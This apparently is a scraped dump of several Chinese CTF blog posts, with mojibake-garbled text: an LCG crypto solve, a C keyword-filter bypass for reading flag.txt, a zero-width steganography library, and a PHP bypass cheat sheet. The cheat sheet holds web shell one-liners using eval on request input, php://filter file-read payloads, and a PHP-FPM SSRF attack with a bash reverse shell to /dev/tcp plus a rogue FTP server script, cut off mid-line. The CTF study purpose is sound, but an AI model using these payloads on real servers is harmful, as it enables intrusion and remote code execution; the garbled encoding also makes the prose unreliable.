easyLCG easy LCG çº¿æ€§åŒä½™ç”Ÿæˆå™¨ï¼ˆLCGï¼‰ çº¿æ€§åŒä½™ç”Ÿæˆå™¨æ˜¯ä¸ªäº§ç”Ÿä¼ªéšæœºæ•°çš„æ–¹æ³•ï¼Œå®ƒæ˜¯æ ¹æ®é€’å½’å…¬å¼ï¼š $N_{j+1}=(A\\times N_j+B)\\pmod M$ å…¶ä¸­$A,B,M$æ˜¯ç”Ÿæˆå™¨è®¾å®šçš„å¸¸æ•°ï¼Œ$A$ä¸ºä¹˜æ•°ï¼Œ$B$ä¸ºå¢é‡ï¼Œ$M$ä¸ºæ¨¡æ•°ã€‚ å·²çŸ¥åˆå§‹$seed_0$åœ¨ç”Ÿæˆå™¨è¿è¡Œä¸€æ¬¡å¾—åˆ°ï¼š $seed_1=(a\\times seed_0+b) \\% m$ $state_1=seed_1\\gt\\gt16$ï¼Œå³ $seed_1=(state_1\\lt\\lt16)+k_1$ åŒæ ·ï¼š $seed_2=(a\\times seed_1+b) \\% m$ $state_2=seed_2\\gt\\gt16$ï¼Œå³ $seed_2=(state_2\\lt\\lt16)+k_2$ è”ç«‹æœ‰ï¼š $state_2=(a \\times ((state_1 \\lt\\lt 16)+ k_1 ) + b) \\% m \\gt\\gt16 $ å·²çŸ¥ $a$ï¼Œ$b$ï¼Œ$m$ï¼Œ$state_1$ï¼Œ$state_2$ï¼Œå¯ä»¥çˆ†ç ´å¾—$k_1$ï¼š 123456789101112a = 3844066521b = 3316005024m = 2249804527state1 = 16269state2 = 4249for k in range(2**32): seed1 = (state1&lt;&lt;16)+k res = ((a*seed1+b)%m)&gt;&gt;16 if res==state2: print(seed1) break è€Œåç»­çš„gen_AB()æ˜¯åœ¨ä»¥ä¸Šé¢è¿­ä»£ä¸¤æ¬¡åçš„$seed_2$ä¸ºåˆå§‹seedçš„ï¼Œæ ¹æ®å¾—åˆ°çš„$seed_1$è®¡ç®—$seed_2=278490266$ï¼Œå¸¦å…¥åç»­æ­¥éª¤å³å¯ã€‚ 123456789101112131415161718192021222324252627282930313233343536from Crypto.Util.number import *a = 3844066521b = 3316005024m = 2249804527state1 = 16269state2 = 4249class LCG: def __init__(self): self.a = 3844066521 self.b = 3316005024 self.m = 2249804527 self.seed = 278490266 def next(self): self.seed = (self.a*self.seed+self.b) % self.m return self.seed &gt;&gt; 16class DH: def __init__(self): self.lcg = LCG() self.g = 183096451267674849541594370111199688704 self.m = 102752586316294557951738800745394456033378966059875498971396396583576430992701 self.A, self.a = self.gen_AB() self.B, self.b = self.gen_AB() self.key = pow(self.A, self.b, self.m) def gen_AB(self): x = &#x27;&#x27; for _ in range(64): x += &#x27;1&#x27; if self.lcg.next() % 2 else &#x27;0&#x27; return pow(self.g, int(x, 2), self.m), int(x, 2)Cipher = 13040004482819935755130996285494678592830702618071750116744173145400949521388647864913527703DH = DH()print(&quot;flag = &#123;&#125;&quot;.format(long_to_bytes(Cipher ^ DH.key))) PWNTaQiniOj-0ncäº¤äº’é¢˜ã€‚ ç”¨Cè¯­è¨€å†™è¯­å¥ï¼Œè¯»å–flag.txtçš„å†…å®¹ã€‚ æµ‹è¯•å‘ç°ç¦ç”¨äº†å…³é”®å­—home|ctf|flagï¼Œç›´æ¥å­—ç¬¦ä¸²åˆ†å‰²ç»•è¿‡ï¼š 12345678910111213141516#include&lt;stdio.h&gt;#include&lt;string.h&gt;void main() &#123; FILE *fp; char str[100]; char path[50] =&quot;/ho&quot;; char path2[50]=&quot;me/ct&quot;; char path3[50]=&quot;f/fl&quot;; char path4[50]=&quot;ag&quot;; strcat(path3,path4); strcat(path2,path3); strcat(path,path2); fp = fopen(path, &quot;r&quot;); fgets(str,100,fp); printf(&quot;%s\\n&quot;,str);&#125;","categories":[{"name":"match","slug":"match","permalink":"https://lazzzaro.github.io/categories/match/"}],"tags":[{"name":"2020èµ›","slug":"2020èµ›","permalink":"https://lazzzaro.github.io/tags/2020%E8%B5%9B/"}],"author":"Lazzaro"},{"title":"é›¶å®½åº¦å­—ç¬¦éšå†™","slug":"misc-é›¶å®½åº¦å­—ç¬¦éšå†™","date":"2020-05-23T16:27:12.000Z","updated":"2022-12-09T15:08:13.581Z","comments":true,"path":"2020/05/24/misc-é›¶å®½åº¦å­—ç¬¦éšå†™/","permalink":"https://lazzzaro.github.io/2020/05/24/misc-%E9%9B%B6%E5%AE%BD%E5%BA%A6%E5%AD%97%E7%AC%A6%E9%9A%90%E5%86%99/","excerpt":"","text":"é›¶å®½åº¦å­—ç¬¦éšå†™/é›¶å®½åº¦ç©ºæ ¼éšå†™/é›¶å®½åº¦ç©ºé—´éšå†™/é›¶å®½éšå†™é›¶å®½åº¦å­—ç¬¦éšå†™æœ¯ï¼ˆZero-Width Space Steganographyï¼‰ï¼š å°†éšè—æ¶ˆæ¯ç¼–ç å’Œè§£ç ä¸ºä¸å¯æ‰“å°/å¯è¯»å­—ç¬¦ã€‚ å­—ç¬¦åŒ…æ‹¬ï¼š é›¶å®½åº¦ç©ºæ ¼ï¼ˆ\\u200bï¼‰ é›¶å®½åº¦éè¿æ¥ç¬¦ï¼ˆ\\u200cï¼‰ é›¶å®½åº¦è¿æ¥ç¬¦ï¼ˆ\\u200dï¼‰ ä»å·¦è‡³å³ä¹¦å†™æ ‡è®°ï¼ˆ\\u200eï¼‰ ä»å³è‡³å·¦ä¹¦å†™æ ‡è®°ï¼ˆ\\u200fï¼‰ è§£å¯† åœ¨çº¿å·¥å…·https://www.mzy0.com/ctftools/zerowidth1/ http://330k.github.io/misc_tools/unicode_steganography.html https://offdev.net/demos/zwsp-steg-js https://yuanfux.github.io/zero-width-web/ http://www.atoolbox.net/Tool.php?Id=829 å…¶ä»–å·¥å…· zwsp-steg-py https://github.com/enodari/zwsp-steg-py è½¬æ¢ è½¬åŒ–ä¸ºäºŒè¿›åˆ¶çš„åŠ å¯†ï¼šhttps://zhuanlan.zhihu.com/p/87919817 è½¬åŒ–ä¸ºMorseç¼–ç çš„åŠ å¯†ï¼šhttps://zhuanlan.zhihu.com/p/75992161 JSè„šæœ¬ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229/** * Zero-Width Unicode Character Steganography * Copyright (c) 2015-2016 Kei Misawa * This software is released under the MIT License. * http://opensource.org/licenses/mit-license.php */(function(exports)&#123; &#x27;use strict&#x27;; var chars = []; var radix = 0; var codelengthText = 0; var codelengthBinary = 0; /** Set characters of coded hidden text(zero width characters) args: string of zero width characters return: null */ var setUseChars = function(newchars)&#123; if(newchars.length &gt;= 2)&#123; chars = newchars.split(&#x27;&#x27;); radix = chars.length; codelengthText = Math.ceil(Math.log(65536) / Math.log(radix)); codelengthBinary = Math.ceil(Math.log(256) / Math.log(radix)); &#125; return null; &#125;; /** Text Encoder args: text: original text to be embedded (String) data: text to be hidden (String) return: unicode stego text */ var encodeText = function(text1, text2)&#123; return combine_shuffle_string(text1, encode_to_zerowidth_characters_text(text2), codelengthText); &#125;; /** Binary Encoder args: text: original text to be embedded (String) data: data to be hidden (Uint8Array) return: unicode stego text */ var encodeBinary = function(text, data)&#123; return combine_shuffle_string(text, encode_to_zerowidth_characters_binary(data), codelengthBinary); &#125;; /** Text Decoder args: unicode text with steganography (String) return: JavaScript Object &#123; originalText: original text (String), hiddenText: hidden data (String) &#125; */ var decodeText = function(text)&#123; var splitted = split_zerowidth_characters(text); return &#123; &#x27;originalText&#x27;: splitted.originalText, &#x27;hiddenText&#x27;: decode_from_zero_width_characters_text(splitted.hiddenText, codelengthText) &#125;; &#125;; /** Binary Decoder args: unicode text with steganography (String) return: JavaScript Object &#123; originalText: original text (String), hiddenData: hidden data (Uint8Array) &#125; */ var decodeBinary = function(text)&#123; var splitted = split_zerowidth_characters(text); return &#123; &#x27;originalText&#x27;: splitted.originalText, &#x27;hiddenData&#x27;: decode_from_zero_width_characters_binary(splitted.hiddenText) &#125;; &#125;; setUseChars(&#x27;\\u200c\\u200d\\u202c\\ufeff&#x27;); exports.unicodeSteganographer = &#123; encodeText: encodeText, decodeText: decodeText, encodeBinary: encodeBinary, decodeBinary: decodeBinary, setUseChars: setUseChars &#125;; /** Internal Functions */ var encode_to_zerowidth_characters_text = function(str1)&#123; var result = new Array(str1.length); var base = &#x27;&#x27;; var i; var c; var d; var r; //var base = &#x27;0&#x27;.repeat(codelength); // IE not support this method for(i = 0; i &lt; codelengthText; i++)&#123; base += &#x27;0&#x27;; &#125; for(i = 0; i &lt; str1.length; i++)&#123; c = str1.charCodeAt(i); d = c.toString(radix); result[i] = (base + d).substr(-codelengthText); &#125; r = result.join(&#x27;&#x27;); for(i = 0; i &lt; radix; i++)&#123; r = r.replace(new RegExp(i, &#x27;g&#x27;), chars[i]); &#125; return r; &#125;; var encode_to_zerowidth_characters_binary = function(u8ary)&#123; var result = new Array(u8ary.length); var base = &#x27;&#x27;; var i; var c; var d; var r; for(i = 0; i &lt; codelengthBinary; i++)&#123; base += &#x27;0&#x27;; &#125; for(i = 0; i &lt; u8ary.length; i++)&#123; d = u8ary[i].toString(radix); result[i] = (base + d).substr(-codelengthBinary); &#125; r = result.join(&#x27;&#x27;); for(i = 0; i &lt; radix; i++)&#123; r = r.replace(new RegExp(i, &#x27;g&#x27;), chars[i]); &#125; return r; &#125;; var combine_shuffle_string = function(str1, str2, codelength)&#123; var result = []; var c0 = str1.split(/([\\u0000-\\u002F\\u003A-\\u0040\\u005b-\\u0060\\u007b-\\u007f])|([\\u0030-\\u0039]+)|([\\u0041-\\u005a\\u0061-\\u007a]+)|([\\u0080-\\u00FF]+)|([\\u0100-\\u017F]+)|([\\u0180-\\u024F]+)|([\\u0250-\\u02AF]+)|([\\u02B0-\\u02FF]+)|([\\u0300-\\u036F]+)|([\\u0370-\\u03FF]+)|([\\u0400-\\u04FF]+)|([\\u0500-\\u052F]+)|([\\u0530-\\u058F]+)|([\\u0590-\\u05FF]+)|([\\u0600-\\u06FF]+)|([\\u0700-\\u074F]+)|([\\u0750-\\u077F]+)|([\\u0780-\\u07BF]+)|([\\u07C0-\\u07FF]+)|([\\u0800-\\u083F]+)|([\\u0840-\\u085F]+)|([\\u08A0-\\u08FF]+)|([\\u0900-\\u097F]+)|([\\u0980-\\u09FF]+)|([\\u0A00-\\u0A7F]+)|([\\u0A80-\\u0AFF]+)|([\\u0B00-\\u0B7F]+)|([\\u0B80-\\u0BFF]+)|([\\u0C00-\\u0C7F]+)|([\\u0C80-\\u0CFF]+)|([\\u0D00-\\u0D7F]+)|([\\u0D80-\\u0DFF]+)|([\\u0E00-\\u0E7F]+)|([\\u0E80-\\u0EFF]+)|([\\u0F00-\\u0FFF]+)|([\\u1000-\\u109F]+)|([\\u10A0-\\u10FF]+)|([\\u1100-\\u11FF]+)|([\\u1200-\\u137F]+)|([\\u1380-\\u139F]+)|([\\u13A0-\\u13FF]+)|([\\u1400-\\u167F]+)|([\\u1680-\\u169F]+)|([\\u16A0-\\u16FF]+)|([\\u1700-\\u171F]+)|([\\u1720-\\u173F]+)|([\\u1740-\\u175F]+)|([\\u1760-\\u177F]+)|([\\u1780-\\u17FF]+)|([\\u1800-\\u18AF]+)|([\\u18B0-\\u18FF]+)|([\\u1900-\\u194F]+)|([\\u1950-\\u197F]+)|([\\u1980-\\u19DF]+)|([\\u19E0-\\u19FF]+)|([\\u1A00-\\u1A1F]+)|([\\u1A20-\\u1AAF]+)|([\\u1AB0-\\u1AFF]+)|([\\u1B00-\\u1B7F]+)|([\\u1B80-\\u1BBF]+)|([\\u1BC0-\\u1BFF]+)|([\\u1C00-\\u1C4F]+)|([\\u1C50-\\u1C7F]+)|([\\u1CC0-\\u1CCF]+)|([\\u1CD0-\\u1CFF]+)|([\\u1D00-\\u1D7F]+)|([\\u1D80-\\u1DBF]+)|([\\u1DC0-\\u1DFF]+)|([\\u1E00-\\u1EFF]+)|([\\u1F00-\\u1FFF]+)|([\\u2000-\\u206F]+)|([\\u2070-\\u209F]+)|([\\u20A0-\\u20CF]+)|([\\u20D0-\\u20FF]+)|([\\u2100-\\u214F]+)|([\\u2150-\\u218F]+)|([\\u2190-\\u21FF]+)|([\\u2200-\\u22FF]+)|([\\u2300-\\u23FF]+)|([\\u2400-\\u243F]+)|([\\u2440-\\u245F]+)|([\\u2460-\\u24FF]+)|([\\u2500-\\u257F]+)|([\\u2580-\\u259F]+)|([\\u25A0-\\u25FF]+)|([\\u2600-\\u26FF]+)|([\\u2700-\\u27BF]+)|([\\u27C0-\\u27EF]+)|([\\u27F0-\\u27FF]+)|([\\u2800-\\u28FF]+)|([\\u2900-\\u297F]+)|([\\u2980-\\u29FF]+)|([\\u2A00-\\u2AFF]+)|([\\u2B00-\\u2BFF]+)|([\\u2C00-\\u2C5F]+)|([\\u2C60-\\u2C7F]+)|([\\u2C80-\\u2CFF]+)|([\\u2D00-\\u2D2F]+)|([\\u2D30-\\u2D7F]+)|([\\u2D80-\\u2DDF]+)|([\\u2DE0-\\u2DFF]+)|([\\u2E00-\\u2E7F]+)|([\\u2E80-\\u2EFF]+)|([\\u2F00-\\u2FDF]+)|([\\u2FF0-\\u2FFF]+)|([\\u3000-\\u303F]+)|([\\u3040-\\u309F]+)|([\\u30A0-\\u30FF]+)|([\\u3100-\\u312F]+)|([\\u3130-\\u318F]+)|([\\u3190-\\u319F]+)|([\\u31A0-\\u31BF]+)|([\\u31C0-\\u31EF]+)|([\\u31F0-\\u31FF]+)|([\\u3200-\\u32FF]+)|([\\u3300-\\u33FF]+)|([\\u3400-\\u4DBF]+)|([\\u4DC0-\\u4DFF]+)|([\\u4E00-\\u9FFF]+)|([\\uA000-\\uA48F]+)|([\\uA490-\\uA4CF]+)|([\\uA4D0-\\uA4FF]+)|([\\uA500-\\uA63F]+)|([\\uA640-\\uA69F]+)|([\\uA6A0-\\uA6FF]+)|([\\uA700-\\uA71F]+)|([\\uA720-\\uA7FF]+)|([\\uA800-\\uA82F]+)|([\\uA830-\\uA83F]+)|([\\uA840-\\uA87F]+)|([\\uA880-\\uA8DF]+)|([\\uA8E0-\\uA8FF]+)|([\\uA900-\\uA92F]+)|([\\uA930-\\uA95F]+)|([\\uA960-\\uA97F]+)|([\\uA980-\\uA9DF]+)|([\\uA9E0-\\uA9FF]+)|([\\uAA00-\\uAA5F]+)|([\\uAA60-\\uAA7F]+)|([\\uAA80-\\uAADF]+)|([\\uAAE0-\\uAAFF]+)|([\\uAB00-\\uAB2F]+)|([\\uAB30-\\uAB6F]+)|([\\uAB70-\\uABBF]+)|([\\uABC0-\\uABFF]+)|([\\uAC00-\\uD7AF]+)|([\\uD7B0-\\uD7FF]+)|([\\uD800-\\uDFFF]+)|([\\uE000-\\uF8FF]+)|([\\uF900-\\uFAFF]+)|([\\uFB00-\\uFB4F]+)|([\\uFB50-\\uFDFF]+)|([\\uFE00-\\uFE0F]+)|([\\uFE10-\\uFE1F]+)|([\\uFE20-\\uFE2F]+)|([\\uFE30-\\uFE4F]+)|([\\uFE50-\\uFE6F]+)|([\\uFE70-\\uFEFF]+)|([\\uFF00-\\uFFEF]+)|([\\uFFF0-\\uFFFF]+)/g); var c1 = []; var i; var j; for(i = 0; i &lt; c0.length; i++)&#123; if((typeof c0[i] !== &#x27;undefined&#x27;) &amp;&amp; (c0[i] !== &#x27;&#x27;))&#123; c1.push(c0[i]); &#125; &#125; var c2 = str2.split(new RegExp(&#x27;(.&#123;&#x27; + codelength + &#x27;&#125;)&#x27;, &#x27;g&#x27;)); var ratio = c1.length / (c1.length + c2.length); /* slow while((c1.length &gt; 0) &amp;&amp; (c2.length &gt; 0))&#123; if(Math.random() &lt;= ratio)&#123; result.push(c1.shift()); &#125;else&#123; result.push(c2.shift()); &#125; &#125;*/ i = 0; j = 0; while((i &lt; c1.length) &amp;&amp; (j &lt; c2.length))&#123; if(Math.random() &lt;= ratio)&#123; result.push(c1[i]); i++; &#125;else&#123; result.push(c2[j]); j++; &#125; &#125; c1 = c1.slice(i); c2 = c2.slice(j); result = result.concat(c1).concat(c2); return result.join(&#x27;&#x27;); &#125;; var split_zerowidth_characters = function(str1)&#123; var result = &#123;&#125;; result.originalText = str1.replace(new RegExp(&#x27;[&#x27; + chars.join(&#x27;&#x27;) + &#x27;]&#x27;, &#x27;g&#x27;), &#x27;&#x27;); result.hiddenText = str1.replace(new RegExp(&#x27;[^&#x27; + chars.join(&#x27;&#x27;) + &#x27;]&#x27;, &#x27;g&#x27;), &#x27;&#x27;); return result; &#125;; var decode_from_zero_width_characters_text = function(str1)&#123; var r = str1; var i; var result = []; for(i = 0; i &lt; radix; i++)&#123; r = r.replace(new RegExp(chars[i], &#x27;g&#x27;), i); &#125; for(i = 0; i &lt; r.length; i += codelengthText)&#123; result.push(String.fromCharCode(parseInt(r.substr(i, codelengthText), radix))); &#125; return result.join(&#x27;&#x27;); &#125;; var decode_from_zero_width_characters_binary = function(str1)&#123; var r = str1; var i; var j; var result = new Uint8Array(Math.ceil(str1.length / codelengthBinary)); for(i = 0; i &lt; radix; i++)&#123; r = r.replace(new RegExp(chars[i], &#x27;g&#x27;), i); &#125; for(i = 0, j = 0; i &lt; r.length; i += codelengthBinary, j++)&#123; result[j] = parseInt(r.substr(i, codelengthBinary), radix); &#125; return result; &#125;; return null;&#125;)(this);var s = unicodeSteganographers.setUseChars(&#x27;\\u200b\\u200c\\u200d\\u200e\\u200f&#x27;);s.decodeText(&quot;æˆ‘å·²ç»çœ‹è§äº†ï¼Œâ€‹â€‹â€‹â€‹â€â€â€‹â€‹â€‹â€‹â€‹â€â€‹â€â€‹â€‹â€‹â€‹â€â€â€Œâ€‹â€‹â€‹â€‹â€â€â€â€‹â€‹â€‹â€‹â€â€â€‹â€‹â€‹â€‹â€‹â€â€â€Œâ€‹â€‹â€‹â€‹â€â€â€Œâ€‹â€‹â€‹â€‹â€â€â€â€‹â€‹â€‹â€‹â€Œâ€Œâ€â€‹â€‹â€‹â€‹â€â€â€â€‹â€‹â€‹â€‹â€â€â€Œâ€‹â€‹â€‹â€‹â€â€â€‹â€‹â€‹â€‹â€‹â€â€‹â€â€‹â€‹â€‹â€‹â€â€â€â€‹â€‹â€‹â€‹â€â€â€â€‹â€‹â€‹â€‹â€â€â€Œâ€‹â€‹â€‹â€‹â€â€â€â€‹â€‹â€‹â€‹â€â€Œâ€â€‹â€‹â€‹â€‹â€â€â€â€‹â€‹â€‹â€‹â€â€â€Œâ€‹â€‹â€‹â€‹â€â€‹â€Œâ€‹â€‹â€‹â€Œâ€‹â€‹â€‹ä½ å‘¢ï¼Ÿ&quot;)","categories":[{"name":"misc","slug":"misc","permalink":"https://lazzzaro.github.io/categories/misc/"}],"tags":[{"name":"éšå†™","slug":"éšå†™","permalink":"https://lazzzaro.github.io/tags/%E9%9A%90%E5%86%99/"}],"author":"Lazzaro"},{"title":"PHPç»•è¿‡","slug":"web-PHPç»•è¿‡","date":"2020-05-18T11:29:09.000Z","updated":"2023-09-08T11:29:14.007Z","comments":true,"path":"2020/05/18/web-PHPç»•è¿‡/","permalink":"https://lazzzaro.github.io/2020/05/18/web-PHP%E7%BB%95%E8%BF%87/","excerpt":"","text":"å¸¸ç”¨å‡½æ•°phpinfo() #PHPé…ç½®é¡µ file_get_contents() #è·å–æ–‡ä»¶å†…å®¹ get_defined_vars() #è·å–æ‰€æœ‰æ–‡ä»¶ï¼ˆåŒ…æ‹¬åŒ…å«çš„æ–‡ä»¶ï¼‰å˜é‡çš„å€¼ â€‹ å˜ç§ä¸€å¥è¯PHP $_GET[a]($_GET[b]); â€‹ å¸¸ç”¨php://filterè¿‡æ»¤å™¨ æ— è¿‡æ»¤å™¨ php://filter/resource= å­—ç¬¦ä¸²è¿‡æ»¤å™¨ php://filter/read=string.rot13/resource= php://filter/read=string.toupper/resource= php://filter/read=string.tolower/resource= php://filter/read=string.string_tags/resource= è½¬æ¢è¿‡æ»¤å™¨ php://filter/read=convert.base64-encode/resource= php://filter/read=convert.quoted-printable-encode/resource= â€‹ å¸¸ç”¨è·¯å¾„ Nginx 123456æ—¥å¿—ï¼š/var/log/nginx/access.logé…ç½®ï¼š/etc/nginx/nginx.conf/usr/local/nginx/conf/nginx.conf Apache 1234567891011æ—¥å¿—ï¼š/var/log/apache/access.log/var/log/apache2/access.log/var/www/logs/access.log/var/log/access.log/etc/httpd/logs/access_log/var/log/httpd/access_logé…ç½®ï¼š/etc/apache2/apache2.conf/etc/httpd/conf/httpd.conf â€‹ ç»•è¿‡å…³é”®è¯ å‡½æ•°åã€æ–¹æ³•åã€ç±»åã€å…³é”®å­—ä¸åŒºåˆ†å¤§å°å†™ &lt;?php Show_source(&#39;index.php&#39;);?&gt; åŠ¨æ€ç‰¹æ€§ &lt;?php base64_decode(&#39;c2hvd19zb3VyY2U=&#39;)(&#39;index.php&#39;);?&gt; &lt;?php echo (&#39;fil&#39;.&#39;e_get_contents&#39;)(&#39;/var/www/html/index.php&#39;);?&gt; 16è¿›åˆ¶ &lt;?php (&quot;\\x70\\x68\\x70\\x69\\x6e\\x66\\x6f&quot;)();?&gt; æº¢å‡º32ä½ï¼š-2147483648 ~ 2147483647 64ä½ï¼š-9223372036854775808 ~ 9223372036854775807 æœ¬åœ°è®¿é—®X-Forwarded-For, X-Client-ip, Client-ip, X-Real-IP è¯·æ±‚æ–¹æ³•æŸ¥çœ‹æ”¯æŒè¯·æ±‚æ–¹æ³•ï¼šOPTIONS ä»»æ„æ–‡ä»¶ä¸Šä¼ ï¼šPUT intval() è¿›åˆ¶è½¬æ¢ åå…­è¿›åˆ¶ï¼š0x??? äºŒè¿›åˆ¶ï¼š0b??? å…«è¿›åˆ¶ï¼š0??? is_numeric() ç‰¹æ®Šå­—ç¬¦ ç©ºæ ¼ã€%00ã€%0a preg_match() æ¢è¡Œç¬¦ %0aï¼ˆæŒ‰è¡ŒåŒ¹é…ç±»ï¼‰ preg_matchå€¼åªåŒ¹é…ç¬¬ä¸€è¡Œï¼Œå¯¹äº/^xxx$/ç±»å‹ï¼Œåœ¨å‰ç«¯æˆ–æœ«å°¾åŠ ä¸Š%0aå³å¯ç»•è¿‡ã€‚ å‘½åç©ºé—´ï¼ˆ\\ï¼‰ åœ¨PHPçš„å‘½åç©ºé—´é»˜è®¤ä¸º\\ï¼Œæ‰€æœ‰çš„å‡½æ•°å’Œç±»éƒ½åœ¨\\è¿™ä¸ªå‘½åç©ºé—´ä¸­ï¼Œå¦‚æœç›´æ¥å†™å‡½æ•°åfunction_name()è°ƒç”¨ï¼Œè°ƒç”¨çš„æ—¶å€™å…¶å®ç›¸å½“äºå†™äº†ä¸€ä¸ªç›¸å¯¹è·¯å¾„ï¼›è€Œå¦‚æœå†™\\function_name() è¿™æ ·è°ƒç”¨å‡½æ•°ï¼Œåˆ™å…¶å®æ˜¯å†™äº†ä¸€ä¸ªç»å¯¹è·¯å¾„ã€‚å¦‚æœä½ åœ¨å…¶ä»–namespaceé‡Œè°ƒç”¨ç³»ç»Ÿç±»ï¼Œå°±å¿…é¡»å†™ç»å¯¹è·¯å¾„è¿™ç§å†™æ³•ã€‚ 123#ä¾‹&lt;?php namespace ccc;\\eval($_REQUEST[&#x27;a&#x27;]);&lt;?php \\system(&#x27;cat /tmp/flag_XXXX&#x27;); å‚è€ƒï¼šCode-Breaking Puzzles é¢˜è§£&amp;å­¦ä¹ ç¯‡ ç¬¦å· åˆ†å·ï¼š?&gt;é—­åˆ å°æ‹¬å·ï¼š ?c=include $_GET[x]?&gt;&amp;x=php://filter/read=convert.base64-encode/resource=index.php ?c=require $_GET[x]?&gt;&amp;x=php://filter/read=convert.base64-encode/resource=index.php æ•°ç»„ preg_matchåªèƒ½å¤„ç†å­—ç¬¦ä¸²ï¼Œå½“ä¼ å…¥çš„subjectæ˜¯æ•°ç»„æ—¶ä¼šè¿”å›falseã€‚ PCREå›æº¯æ¬¡æ•°é™åˆ¶ å‚è€ƒï¼šPHPåˆ©ç”¨PCREå›æº¯æ¬¡æ•°é™åˆ¶ç»•è¿‡æŸäº›å®‰å…¨é™åˆ¶ pcre.backtrack_limitç»™pcreè®¾å®šäº†ä¸€ä¸ªå›æº¯æ¬¡æ•°ä¸Šé™ï¼Œé»˜è®¤ä¸º1000000ï¼Œå¦‚æœå›æº¯æ¬¡æ•°è¶…è¿‡è¿™ä¸ªæ•°å­—ï¼Œpreg_matchä¼šè¿”å›falseã€‚ in_array() å‘½åç©ºé—´ï¼ˆ\\ï¼‰ åœ¨PHPçš„å‘½åç©ºé—´é»˜è®¤ä¸º\\ï¼Œæ‰€æœ‰çš„å‡½æ•°å’Œç±»éƒ½åœ¨\\è¿™ä¸ªå‘½åç©ºé—´ä¸­ï¼Œå¦‚æœç›´æ¥å†™å‡½æ•°åfunction_name()è°ƒç”¨ï¼Œè°ƒç”¨çš„æ—¶å€™å…¶å®ç›¸å½“äºå†™äº†ä¸€ä¸ªç›¸å¯¹è·¯å¾„ï¼›è€Œå¦‚æœå†™\\function_name() è¿™æ ·è°ƒç”¨å‡½æ•°ï¼Œåˆ™å…¶å®æ˜¯å†™äº†ä¸€ä¸ªç»å¯¹è·¯å¾„ã€‚å¦‚æœä½ åœ¨å…¶ä»–namespaceé‡Œè°ƒç”¨ç³»ç»Ÿç±»ï¼Œå°±å¿…é¡»å†™ç»å¯¹è·¯å¾„è¿™ç§å†™æ³•ã€‚ 123#ä¾‹&lt;?php namespace ccc;\\eval($_REQUEST[&#x27;a&#x27;]);&lt;?php \\system(&#x27;cat /tmp/flag_XXXX&#x27;); å‚è€ƒï¼šCode-Breaking-Puzzles-é¢˜è§£-å­¦ä¹ ç¯‡ $_SERVER[â€˜QUERY_STRINGâ€™] URLç¼–ç  $_SERVER[â€˜QUERY_STRINGâ€™]ä¸ä¼šè¿›è¡ŒURLDecodeã€‚ å˜é‡è¦†ç›– ?_POST[key1]=36d&amp;_POST[key2]=36d $_REQUEST POSTè¦†ç›– $_REQUESTåŒæ—¶æ¥å—GETå’ŒPOSTçš„æ•°æ®ï¼Œå¹¶ä¸”POSTå…·æœ‰æ›´é«˜çš„ä¼˜å…ˆå€¼ï¼Œåªéœ€è¦åŒæ—¶GETå’ŒPOSTæœ‰ç›¸åŒçš„å‚æ•°ï¼Œåœ¨æ£€æµ‹æ—¶POSTçš„å€¼å°±ä¼šè¦†ç›–GETçš„å€¼ä»è€Œç»•è¿‡ã€‚ file_get_contents() ä½¿ç”¨ php://input æˆ– data://text/plain,xxx å†™æ–‡ä»¶ æ–‡ä»¶å†…å®¹éœ€æ»¡è¶³å›ºå®šå­—ç¬¦ä¸²å‰ç¼€ filteré“¾æ„é€ ï¼Œå‚è€ƒï¼š Solving â€œincluderâ€™s revengeâ€ from hxp ctf 2021 without controlling any files PHP filter chain generator idekCTF 2022 - Paywall file_put_contents() æ”»å‡»php-fpmï¼ˆæœªæˆæƒè®¿é—®æ¼æ´ï¼‰ å¦‚æœç›®æ ‡ä¸»æœºä¸Šæ­£åœ¨è¿è¡Œç€ PHP-FPMï¼Œå¹¶ä¸”æœ‰ä¸€ä¸ªfile_put_contents()å‡½æ•°çš„å‚æ•°æ˜¯å¯æ§çš„ï¼Œå¯ä»¥ä½¿ç”¨ FTP åè®®çš„è¢«åŠ¨æ¨¡å¼ï¼šå®¢æˆ·ç«¯è¯•å›¾ä»FTPæœåŠ¡å™¨ä¸Šè¯»å–/å†™å…¥ä¸€ä¸ªæ–‡ä»¶ï¼ŒæœåŠ¡å™¨ä¼šé€šçŸ¥å®¢æˆ·ç«¯å°†æ–‡ä»¶çš„å†…å®¹è¯»å–åˆ°ä¸€ä¸ªæŒ‡å®šçš„IPå’Œç«¯å£ä¸Šï¼Œæˆ‘ä»¬å¯ä»¥æŒ‡å®šåˆ°127.0.0.1:9000ï¼Œè¿™æ ·å°±å¯ä»¥å‘ç›®æ ‡ä¸»æœºçš„ PHP-FPM å‘é€ä¸€ä¸ªä»»æ„çš„æ•°æ®åŒ…ï¼Œä»è€Œæ‰§è¡Œä»£ç ï¼Œé€ æˆSSRFã€‚ file_put_contents($_GET[&#39;file&#39;], $_GET[&#39;data&#39;]); å…ˆç”¨ gopherus ç”Ÿæˆä¸€ä¸ªåå¼¹shellçš„payloadï¼Œæˆªå– _ åé¢çš„éƒ¨åˆ† /var/www/html/index.php bash -c &quot;bash -i &gt;&amp; /dev/tcp/[IP]/[Port] 0&gt;&amp;1&quot; å…³äºFTPçš„è¿”å›ç ï¼Œæˆ‘ä»¬çœ‹åˆ°227ï¼š Entering Passive Mode &lt;h1,h2,h3,h4,p1,p2&gt; è¿›å…¥è¢«åŠ¨æ¨¡å¼(h1,h2,h3,h4,p1,p2) æˆ‘ä»¬å¯ä»¥ç”¨æ¥è¿›å…¥è¢«åŠ¨æ¨¡å¼ï¼Œhå’Œpåˆ†åˆ«ä¸ºåœ°å€å’Œç«¯å£ï¼Œæ­å»ºä¸€ä¸ªæ¶æ„çš„ ftp æœåŠ¡å™¨ï¼š 123456789101112131415import sockets = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.bind((&#x27;0.0.0.0&#x27;, 123))s.listen(1)conn, addr = s.accept()conn.send(b&#x27;220 welcome\\n&#x27;)conn.send(b&#x27;331 Please specify the password.\\n&#x27;)conn.send(b&#x27;230 Login successful.\\n&#x27;)conn.send(b&#x27;200 Switching to Binary mode.\\n&#x27;)conn.send(b&#x27;550 Could not get the file size.\\n&#x27;)conn.send(b&#x27;150 ok\\n&#x27;)conn.send(b&#x27;227 Entering Extended 